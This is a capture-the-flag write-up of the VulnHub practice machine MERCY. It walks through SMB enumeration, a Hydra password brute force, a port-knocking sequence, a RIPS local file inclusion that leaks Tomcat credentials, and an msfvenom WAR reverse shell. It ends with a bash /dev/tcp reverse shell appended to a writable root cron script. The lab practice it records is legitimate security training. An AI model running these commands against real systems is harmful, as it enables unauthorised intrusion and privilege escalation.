## Introduction
*MERCY is a machine dedicated to Offensive Security for the PWK course, and to a great friend of mine who was there to share my sufferance with me. :-)  
MERCY is a name-play on some aspects of the PWK course. It is NOT a hint for the box.  
Note: Some report a kernel privilege escalation works on this machine. If it does, try harder! There is another vector that you should try!*

This box is on the [NetSecFocus Admin list](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0) of OSCP-like machines. It's [MERCY](https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/) from vulnhub. 

## Ports
We have quite a few ports:

1. 22/tcp   filtered ssh
2. 53/tcp   open     domain
3. 80/tcp   filtered http
4. 110/tcp  open     pop3
5. 139/tcp  open     netbios-ssn
6. 143/tcp  open     imap
7. 445/tcp  open     microsoft-ds
8. 993/tcp  open     imaps
9. 995/tcp  open     pop3s
10. 8080/tcp open     http-proxy

So; SSH (filtered), DNS, HTTP (filtered), mail with SSL, SMB and another HTTP port. Whew!

## 8080
Port 8080 is running Apache Tomcat 7, but it's just the front page - we have no creds. There is a robots.txt pointing to:

>http://192.168.1.169:8080/tryharder/tryharder

Here we find some base64 encoded text that decodes to a message warning about weak passwords, and specifically mentioning "password". 

We'll come back to Tomcat later.

## SMB
I didn't do this whole thing without hints. Maybe 50% of it. I've been taking the attitude if I'm not getting anywhere after some time then get a hint; hopefully it will produce some learning rather than making me lazy. I'm not doing this for imaginary internet points.

Anyway; SMB. I could see the shares with *smbclient* and *smbmap*:

{% highlight shell %}
root@kali:/opt/vulnhub/mercy# smbclient -L //192.168.1.169
smbclient -L //192.168.1.169
Enter WORKGROUP\roots password:

        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        qiu                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (MERCY server (Samba, Ubuntu))
root@kali:/opt/vulnhub/mercy#
{% endhighlight %}

But I couldn't log in without any creds. While I had used it before, I didn't think to try *enum4linux*. But that's what we need to do:

``
root@kali:/opt/vulnhub/mercy# enum4linux  192.168.1.169
``

With that, we get some users:

{% highlight shell %}
S-1-22-1-1000 Unix User\pleadformercy (Local User)
S-1-22-1-1001 Unix User\qiu (Local User)
S-1-22-1-1002 Unix User\thisisasuperduperlonguser (Local User)
S-1-22-1-1003 Unix User\fluffy (Local User)
{% endhighlight %}

## SMB, logged in
I tried running my users against POP, SMB and the http basic authentication on Tomcat with Hydra but wasn't getting anywhere. I checked a hint and the SMB password for user *qiu* was literally *password*; this should have broken almost immediately. And in fact this does work with other wordlists:

{% highlight shell %}
root@kali:/opt/vulnhub/mercy# hydra -L users -P /usr/share/seclists/Passwords/probable-v2-top207.txt smb://192.168.1.169
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-21 06:24:35
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore

[445][smb] host: 192.168.1.169   login: qiu   password: password
1 of 1 target successfully completed, 1 valid password found
{% endhighlight %}

I have no idea why it didn't work with *rockyou*.

Anyway; we find a config file, partially reproduced here:

{% highlight shell %}
root@kali:/opt/vulnhub/mercy/opensesame# cat config
Here are settings for your perusal.

Port Knocking Daemon Configuration

[options]
        UseSyslog

[openHTTP]
        sequence    = 159,27391,4
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn
{% endhighlight %}

So we have port knocking enabled, and now we know the sequence.

## Knock knock
I didn't have *knock* installed on this box, so I installed it, ran it and then ran nmap again to see if we had an open HTTP port - success!

{% highlight shell %}
root@kali:/opt/vulnhub/mercy# apt install knockd

{% endhighlight %}

## HTTP
On the website we can find *robots.txt* which shows us */mercy* and */nomercy*. At */nomercy* with find an install of RIPS 0.53, which searchsploit tells us has *Multiple Local File Inclusions*. 

It didn't take me long to figure out this was the way to find out Tomcat credentials:

``
http://192.168.1.169/nomercy/windows/code.php?file=../../../../../../etc/tomcat7/tomcat-users.xml
``

This was quite similar to Tabby from HTB. 

{% highlight xml %}
<role rolename="admin-gui"/>
<role rolename="manager-gui"/>
<user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/>
<user username="fluffy" password="freakishfluffybunny" roles="none"/>
{% endhighlight %}

So then we could login to Tomcat as *thisisasuperduperlonguser*. 

## Tomcat
With the Tomcat GUI we could upload a WAR file:

``
root@kali:/opt/vulnhub/mercy# msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.150 LPORT=1234 -f war > shell.war
``

And then we had a shell.

## Fluffy
Since we already had a password for Fluffy, we should try it:

{% highlight shell %}
uid=116(tomcat7) gid=126(tomcat7) groups=126(tomcat7)
python -c 'import pty;pty.spawn("/bin/bash");'
tomcat7@MERCY:/var/lib/tomcat7$ su fluffy
su fluffy
Password: freakishfluffybunny

$ python -c 'import pty;pty.spawn("/bin/bash");'
python -c 'import pty;pty.spawn("/bin/bash");'
fluffy@MERCY:/var/lib/tomcat7$ cd /home/fluffy
{% endhighlight %}

Once we're there we find a script which is running on a cron as root; that's not obvious. What is (or should be) obvious is that we can edit it:

{% highlight shell %}
fluffy@MERCY:~/.private/secrets$ ls -lash
ls -lash
total 20K
4.0K drwxr-xr-x 2 fluffy fluffy 4.0K Nov 20  2018 .
4.0K drwxr-xr-x 3 fluffy fluffy 4.0K Nov 20  2018 ..
4.0K -rwxr-xr-x 1 fluffy fluffy   37 Nov 20  2018 backup.save
4.0K -rw-r--r-- 1 fluffy fluffy   12 Nov 20  2018 .secrets
4.0K -rwxrwxrwx 1 root   root    222 Nov 20  2018 timeclock
{% endhighlight %}

``
fluffy@MERCY:~/.private/secrets$ printf 'bash -i >& /dev/tcp/192.168.1.150/1235 0>&1\n' >> timeclock
``

Now it's wait for a shell:

{% highlight shell %}
root@kali:/opt/vulnhub/mercy# nc -nvlp 1235
listening on [any] 1235 ...
connect to [192.168.1.150] from (UNKNOWN) [192.168.1.169] 51992

Congratulations on rooting MERCY. :-)
{% endhighlight %}

BOOM. 

## Epilogue
Learnings:

1. If SMB, run *enum4linux*
2. Use a short password list *first*, don't go straight to rockyou
3. Look at file permissions closely
